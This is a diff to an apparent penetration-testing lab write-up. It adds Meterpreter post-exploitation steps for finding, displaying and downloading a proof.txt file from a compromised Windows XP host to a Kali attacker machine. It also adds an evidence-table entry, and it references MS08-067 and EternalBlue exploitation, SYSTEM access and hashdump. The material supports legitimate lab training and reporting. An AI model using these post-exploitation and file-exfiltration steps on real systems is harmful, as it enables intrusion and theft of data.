@@ -311,6 +311,12 @@ meterpreter > screenshot
 # Flags / proof (adjust paths per rubric):
 meterpreter > search -f proof.txt
 meterpreter > search -f local.txt
+# Peek contents (prints in this terminal — screenshot for report):
+meterpreter > cat "c:\\Documents and Settings\\Barbara\\Desktop\\proof.txt"
+# Copy file to Kali (in a normal Kali shell first: mkdir -p ~/loot/100):
+meterpreter > lcd /root/loot/100
+# If you are not root: lcd /home/kali/loot/100   (absolute path; ~ may not expand in lcd)
+meterpreter > download "c:\\Documents and Settings\\Barbara\\Desktop\\proof.txt"
 meterpreter > shell
 C:\> hostname
 C:\> whoami
@@ -324,6 +330,8 @@ msf5 > sessions -l
 
 **Stability:** Prefer **`getuid` / `sysinfo` / `screenshot`** before heavy **`hashdump`** or **`migrate`** (can bluescreen **XP**). **`exit`** in **`shell`** returns to **`meterpreter`**.
 
+**`cat` vs `download`:** **`cat <remote-path>`** only **displays** the file (Unix **`cat`**-style in Meterpreter). **`download <remote-path>`** pulls a copy onto **Kali** into the directory set by **`lcd`** (your local working directory for downloads). There is no **`get`** in classic Meterpreter for arbitrary files — use **`download`**. Paths with spaces: use **quotes** and **double backslashes** as in the block above.
+
 ### Evidence (`100-NNN_*` — chronological for this host)
 
 | # | File | What it shows |
@@ -332,6 +340,7 @@ msf5 > sessions -l
 | **100-002** | [`100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png`](../Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png) | **`ms17_010_eternalblue` → `check`** — **`[-] … timed out … :135`** alongside **`[+] … likely VULNERABLE`** / **target is vulnerable** (RPC path flaky; see MSF note above) |
 | **100-003** | [`100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png`](../Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png) | **`ms08_067_netapi`** **`run`** — **XP SP3** (English) — **Meterpreter session** **`10.20.150.106:4444` → `10.20.160.100`** |
 | **100-004** | [`100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png`](../Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png) | **`sysinfo`** — **ADRASTEA** / **JUPITER** / **XP SP3** **x86**; **`getuid`** **SYSTEM**; **`shell`** → **`echo`** with **`%date% %time%`** (evidence stamp) |
+| **100-005** | [`100-005_meterpreter_search_proof_txt_barbara_desktop_tm6_afrocha.png`](../Screenshots/100-005_meterpreter_search_proof_txt_barbara_desktop_tm6_afrocha.png) | **`search -f proof.txt`** → **`c:\Documents and Settings\Barbara\Desktop\proof.txt`** (32 bytes) |
 
 ---
 
